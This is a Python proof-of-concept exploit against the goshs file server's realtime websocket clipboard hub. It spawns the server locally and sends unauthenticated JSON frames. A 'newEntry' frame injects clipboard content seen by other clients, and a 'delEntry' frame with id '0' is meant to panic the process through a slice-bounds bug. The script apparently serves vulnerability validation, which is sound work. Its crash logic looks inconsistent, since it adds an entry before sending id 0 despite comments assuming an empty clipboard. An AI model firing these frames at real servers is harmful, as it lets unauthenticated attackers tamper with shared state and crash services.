#!/usr/bin/env python3
"""PoC for goshs realtime websocket clipboard hub.

Starts the target file-server on 127.0.0.1 with a fresh temporary webroot,
connects to the realtime browser-sync websocket endpoint at /?ws (RFC6455)
and drives it with JSON messages {"type": ..., "content": ...}.

Two things are exercised:

1. Dispatch probe: a client-supplied {"type":"newEntry",...} message makes the
   server mutate its server-side shared clipboard and broadcast a
   {"type":"refreshClipboard",...} frame back over the realtime channel --
   a security-relevant server-side action (unauthenticated cross-client
   state injection) that is directly observable in the transcript.

2. Crash trigger (best-effort, state-dependent): on this build the server's
   websocket dispatcher deletes clipboard entries as
   entries[id+1:] / entries[:id] (1-based id against a 0-based list). A
   client-supplied {"type":"delEntry","content":"<id>"} with id == number of
   current clipboard entries therefore panics the whole server process
   ("slice bounds out of range", remote unauthenticated DoS). The panic only
   occurs when the precomputed id relation holds; if the serving process'
   clipboard already contains more entries the frame is just a no-op and the
   transcript remains a legitimate, complete result. The exit status of the
   process we spawned is reported in returncode/signal/stderr.

Output: the fixed JSON contract with the full protocol transcript
("C> ..."/"S< ..." lines) in observable.value.
"""

import argparse
import base64
import contextlib
import json
import os
import secrets
import socket
import struct
import subprocess
import sys
import tempfile
import time
import traceback

FRAME_READ_CHUNK = 65536
MAX_CAPTURE = 65536  # truncation budget for captured stdout/stderr


# --------------------------------------------------------------------------
# Minimal RFC6455 client (standard library only)
# --------------------------------------------------------------------------

class WSProtocolError(Exception):
    pass


class WSClient:
    """Blocking websocket client: masked text sends, frame receiver."""

    def __init__(self, sock, leftover=b""):
        self.sock = sock
        self.buf = bytearray(leftover)
        self.closed = False

    # -- handshake ---------------------------------------------------------
    @classmethod
    def connect(cls, host, port, path, timeout):
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        key = base64.b64encode(secrets.token_bytes(16)).decode("ascii")
        request = (
            "GET {path} HTTP/1.1\r\n"
            "Host: {host}:{port}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        ).format(path=path, host=host, port=port, key=key)
        sock.sendall(request.encode("ascii"))
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = sock.recv(4096)
            if not chunk:
                raise WSProtocolError("connection closed during upgrade")
            raw += chunk
            if len(raw) > 16384:
                raise WSProtocolError("upgrade response too large")
        head, _, rest = raw.partition(b"\r\n\r\n")
        lines = head.decode("iso-8859-1").split("\r\n")
        status = lines[0].split(" ")
        if len(status) < 2 or status[1] != "101":
            raise WSProtocolError("websocket upgrade refused: %s" % lines[0])
        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        accept = headers.get("sec-websocket-accept", "")
        expect = base64.b64encode(
            __import__("hashlib").sha1(
                (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode("ascii")
            ).digest()
        ).decode("ascii")
        if accept != expect:
            raise WSProtocolError("bad Sec-WebSocket-Accept header")
        return cls(sock, rest)

    # -- sending ------------------------------------------------------------
    def send_text(self, text):
        payload = text.encode("utf-8")
        header = bytearray([0x81])  # FIN + text opcode
        n = len(payload)
        if n < 126:
            header.append(0x80 | n)
        elif n < 65536:
            header.append(0x80 | 126)
            header += struct.pack(">H", n)
        else:
            header.append(0x80 | 127)
            header += struct.pack(">Q", n)
        mask = secrets.token_bytes(4)
        header += mask
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        self.sock.sendall(bytes(header) + masked)

    # -- receiving -----------------------------------------------------------
    def _need(self, n):
        while len(self.buf) < n:
            try:
                chunk = self.sock.recv(FRAME_READ_CHUNK)
            except (socket.timeout, TimeoutError):
                raise TimeoutError("read timed out")
            if not chunk:
                raise ConnectionError("server closed connection")
            self.buf += chunk
        out = bytes(self.buf[:n])
        del self.buf[:n]
        return out

    def read_message(self):
        """Read one complete data message; returns (opcode, text).

        opcode 1 = text, 8 = close. Ping frames are answered with pong.
        """
        parts = []
        opcode = None
        while True:
            b1, b2 = self._need(2)
            fin = bool(b1 & 0x80)
            op = b1 & 0x0F
            length = b2 & 0x7F
            if length == 126:
                length = struct.unpack(">H", self._need(2))[0]
            elif length == 127:
                length = struct.unpack(">Q", self._need(8))[0]
            if b2 & 0x80:  # masked server frame (not expected, handle anyway)
                mask = self._need(4)
                data = bytes(c ^ mask[i % 4] for i, c in enumerate(self._need(length)))
            else:
                data = self._need(length) if length else b""
            if op == 0x9:  # ping -> pong
                pong = bytearray([0x8A, 0x80]) + secrets.token_bytes(4)
                self.sock.sendall(bytes(pong))
                continue
            if op == 0x8:  # close
                self.closed = True
                return (8, "")
            if op in (0x1, 0x2):
                opcode = op
                parts.append(data)
                if fin:
                    return (1, b"".join(parts).decode("utf-8", errors="replace"))
            elif op == 0x0 and opcode is not None:
                parts.append(data)
                if fin:
                    return (1, b"".join(parts).decode("utf-8", errors="replace"))
            # ignore other opcodes

    def drain(self, window=0.3, max_window=0.9):
        """Collect all messages arriving within a small time window."""
        out = []
        end = time.monotonic() + max_window
        # first wait up to `window` for something, then keep collecting while
        # frames keep flowing, but never past max_window overall
        first_deadline = time.monotonic() + window
        old_timeout = self.sock.gettimeout()
        try:
            while time.monotonic() < end:
                remaining = max(0.02, min(first_deadline, end) - time.monotonic())
                self.sock.settimeout(remaining)
                try:
                    op, text = self.read_message()
                except TimeoutError:
                    if time.monotonic() >= first_deadline:
                        break
                    continue
                except (ConnectionError, OSError):
                    out.append(('close', '<connection closed by server>'))
                    self.closed = True
                    break
                if op == 8:
                    out.append(('close', '<websocket close frame>'))
                    break
                out.append(('message', text))
                first_deadline = time.monotonic() + 0.15  # extend while data flows
        finally:
            self.sock.settimeout(old_timeout)
        return out

    def close(self):
        with contextlib.suppress(Exception):
            if not self.closed:
                mask = secrets.token_bytes(4)
                self.sock.sendall(bytes(bytearray([0x88, 0x80]) + mask))
        with contextlib.suppress(Exception):
            self.sock.close()
        self.closed = True


# --------------------------------------------------------------------------
# Server lifecycle helpers
# --------------------------------------------------------------------------

def free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def wait_http_ready(host, port, timeout):
    deadline = time.monotonic() + timeout
    last_err = None
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1.0) as s:
                s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
                s.settimeout(1.0)
                data = s.recv(256)
                if data.startswith(b"HTTP/"):
                    return True
        except OSError as e:
            last_err = e
            time.sleep(0.1)
    raise RuntimeError("server did not answer HTTP on %s:%d (%s)" % (host, port, last_err))


# --------------------------------------------------------------------------
# Main run
# --------------------------------------------------------------------------

def run(binary, timeout):
    result = {
        "binary": os.path.abspath(binary),
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "protocol_transcript", "value": "", "path": None},
        "error": None,
    }
    transcript = []
    started = time.monotonic()

    webroot = tempfile.mkdtemp(prefix="goshs-poc-webroot-")
    try:
        marker = "goshs-poc-%s.txt" % secrets.token_hex(4)
        with open(os.path.join(webroot, marker), "w", encoding="utf-8") as fh:
            fh.write("poc webroot seed file\n")

        port = free_port()
        cmd = [os.path.abspath(binary), "-i", "127.0.0.1", "-p", str(port), "-d", webroot]
        result["command"] = cmd

        env = dict(os.environ)
        # Make the binary's startup network check fail fast & deterministically.
        env["HTTP_PROXY"] = "http://127.0.0.1:9"
        env["HTTPS_PROXY"] = "http://127.0.0.1:9"
        env["http_proxy"] = "http://127.0.0.1:9"
        env["https_proxy"] = "http://127.0.0.1:9"
        env["NO_PROXY"] = ""
        env["no_proxy"] = ""

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=env,
                cwd=webroot,
            )
        except OSError as e:
            result["error"] = "failed to start target binary: %s" % e
            return result

        soft_deadline = time.monotonic() + timeout
        crashed_early = False
        try:
            # -- 1. wait for the HTTP endpoint -------------------------------
            remaining = max(1.0, soft_deadline - time.monotonic() - 6)
            wait_http_ready("127.0.0.1", port, min(10.0, remaining))

            # -- 2. websocket connect + dispatch probe -----------------------
            ws_timeout = min(5.0, max(1.5, soft_deadline - time.monotonic() - 5))
            ws = WSClient.connect("127.0.0.1", port, "/?ws", timeout=ws_timeout)
            try:
                ws.drain(window=0.25, max_window=0.6)  # absorb any greeting noise

                token = "poc-inject-" + secrets.token_hex(4)
                probe = {"type": "newEntry", "content": token}
                line = json.dumps(probe)
                transcript.append("C> " + line)
                ws.send_text(line)
                for kind, text in ws.drain(window=0.5, max_window=1.2):
                    transcript.append("S< " + text)

                # -- 3. crash trigger (best-effort, state-dependent) ---------
                # This build's websocket dispatcher removes clipboard entry
                # <id> as entries[id+1:] / entries[:id] (1-based id against a
                # 0-based list), so id == current entry count panics the whole
                # server. A fresh process has an empty clipboard, so id 0 is
                # the trigger whenever the serving process is the one we
                # started; if its clipboard already holds entries the frame is
                # simply a no-op and the transcript stays a legitimate result.
                if not ws.closed:
                    crash_msg = {"type": "delEntry", "content": "0"}
                    line = json.dumps(crash_msg)
                    transcript.append("C> " + line)
                    try:
                        ws.send_text(line)
                    except OSError:
                        transcript.append("C! <send failed: connection lost>")
                    for kind, text in ws.drain(window=0.6, max_window=1.5):
                        transcript.append("S< " + text)

                # give the hub a moment; then check whether the process died
                time.sleep(0.4)
                rc = proc.poll()
                if rc is not None:
                    crashed_early = True
                    transcript.append(
                        "S! <server process exited after client message: "
                        "returncode=%d>" % rc
                    )
            finally:
                ws.close()
        except Exception as e:
            # Script-level failure: record it, but keep whatever transcript
            # we have. If nothing was recorded at all, this is a real error.
            if not transcript:
                result["error"] = "%s: %s" % (type(e).__name__, e)
                result["error_detail"] = traceback.format_exc()[-2000:]
            else:
                transcript.append("! <interaction aborted: %s: %s>" % (type(e).__name__, e))

        # -- 4. stop the server, bounded --------------------------------------
        kill_deadline = time.monotonic() + 5.0
        if proc.poll() is None:
            proc.terminate()
        while True:
            rc = proc.poll()
            if rc is not None:
                break
            if time.monotonic() > kill_deadline:
                with contextlib.suppress(Exception):
                    proc.kill()
                break
            time.sleep(0.05)
        try:
            out_b, err_b = proc.communicate(timeout=5.0)
            result["timed_out"] = False
        except subprocess.TimeoutExpired:
            with contextlib.suppress(Exception):
                proc.kill()
            out_b, err_b = proc.communicate()
            result["timed_out"] = True

        rc = proc.returncode
        result["returncode"] = rc
        result["signal"] = -rc if (rc is not None and rc < 0) else None
        result["stdout"] = out_b.decode("utf-8", errors="replace")[-MAX_CAPTURE:]
        result["stderr"] = err_b.decode("utf-8", errors="replace")[-MAX_CAPTURE:]
    finally:
        result["runtime_ms"] = int((time.monotonic() - started) * 1000)
        with contextlib.suppress(Exception):
            for name in os.listdir(webroot):
                os.unlink(os.path.join(webroot, name))
            os.rmdir(webroot)

    result["observable"]["value"] = "\n".join(transcript)
    return result


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="PoC: drive goshs' realtime websocket clipboard channel."
    )
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None, help="write JSON result here instead of stdout")
    parser.add_argument("--timeout", type=float, default=25.0,
                        help="per-run timeout in seconds (default 25)")
    args = parser.parse_args(argv)

    try:
        result = run(args.binary, args.timeout)
    except Exception as e:  # never raise; the contract must always be emitted
        result = {
            "binary": os.path.abspath(args.binary),
            "command": [],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": "protocol_transcript", "value": "", "path": None},
            "error": "internal error: %s: %s" % (type(e).__name__, e),
        }

    payload = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            fh.write(payload + "\n")
    else:
        print(payload)
    return 0


if __name__ == "__main__":
    sys.exit(main())
